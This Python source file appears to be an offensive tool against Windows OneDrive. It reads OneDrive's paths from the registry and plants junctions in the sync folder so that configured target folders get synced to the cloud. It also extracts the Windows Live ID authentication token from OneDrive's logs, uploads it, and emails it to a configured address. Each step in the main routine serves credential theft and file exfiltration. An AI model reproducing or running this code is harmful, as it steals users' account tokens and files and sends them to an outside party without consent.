from dataclasses import dataclass
import subprocess
import time
import os
import winreg

import options
from odl_parser.odl import get_windows_live_id_from_odls
from onedrive_api.onedrive_session import OneDriveSession
from reparse_points.reparse_points import create_mount_point

@dataclass
class OneDriveInfo:
    program_folder: str
    sync_folder: str
    odl_folder: str
    main_exe_path: str
    version_installation_folder: str

ONEDRIVE_PER_USER_FOLDER = os.path.expandvars(r"%localappdata%\Microsoft\OneDrive")
ODL_FOLDER = os.path.join(ONEDRIVE_PER_USER_FOLDER, "logs\\Personal")

def get_onedrive_info():
    hkcu_key = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
    
    with winreg.OpenKey(hkcu_key, "Software\\Microsoft\\OneDrive\\Accounts\\Personal") as onedrive_personal_reg_key:
        onedrive_sync_folder = winreg.QueryValueEx(onedrive_personal_reg_key, "UserFolder")[0]

    with winreg.OpenKey(hkcu_key, "Software\\Microsoft\\OneDrive") as onedrive_reg_key:
        onedrive_exe_path = winreg.QueryValueEx(onedrive_reg_key, "OneDriveTrigger")[0]
        onedrive_version = winreg.QueryValueEx(onedrive_reg_key, "Version")[0]
    
    onedrive_program_folder = os.path.dirname(onedrive_exe_path)
    onedrive_version_installation_folder = os.path.join(onedrive_program_folder, onedrive_version)

    return OneDriveInfo(onedrive_program_folder, onedrive_sync_folder, ODL_FOLDER, onedrive_exe_path, onedrive_version_installation_folder)


def restart_onedrive(onedrive_info: OneDriveInfo):
    process = subprocess.Popen(f"\"{onedrive_info.main_exe_path}\" /shutdown", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    process.wait()
    time.sleep(3)
    process = subprocess.Popen(f"\"{onedrive_info.main_exe_path}\"", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def extract_windows_live_token(onedrive_info: OneDriveInfo):
    # restart_onedrive(onedrive_info)
    # time.sleep(25)
    return get_windows_live_id_from_odls()


def main():
    onedrive_info = get_onedrive_info()

    if options.SHOULD_CREATE_ONEDRIVE_BINARIES_JUNCTION:
        junctions_names_to_target_paths = options.JUNCTION_NAMES_TO_TARGET_PATHS.copy()
        junctions_names_to_target_paths[options.ONEDRIVE_VERSION_FOLDER_JUNCTION_NAME] = onedrive_info.version_installation_folder
    else:
       junctions_names_to_target_paths = options.JUNCTION_NAMES_TO_TARGET_PATHS

    print("Creating junctions to targets")
    for junction_name, target_path in junctions_names_to_target_paths.items():
        junction_path = os.path.join(onedrive_info.sync_folder, junction_name)
        create_mount_point(junction_path, target_path)

    print("Extracting Windows Live ID token from OneDrive's logs")
    windows_live_token = extract_windows_live_token(onedrive_info)
    onedrive_session = OneDriveSession()
    onedrive_session.login_using_token(windows_live_token)
    print("Uploading token to OneDrive")
    onedrive_token_file_item = onedrive_session.create_file(f"/{options.TOKEN_FILE_NAME}", windows_live_token)
    print("Sending token file to the configured email address using OneDrive API")
    onedrive_session.send_item_to_email(onedrive_token_file_item, options.TOKEN_DST_EMAIL_ADDRESS)
    
    # Force OneDrive to sync files instantly, faster than waiting
    # restart_onedrive(onedrive_info)


if "__main__" == __name__:
    main()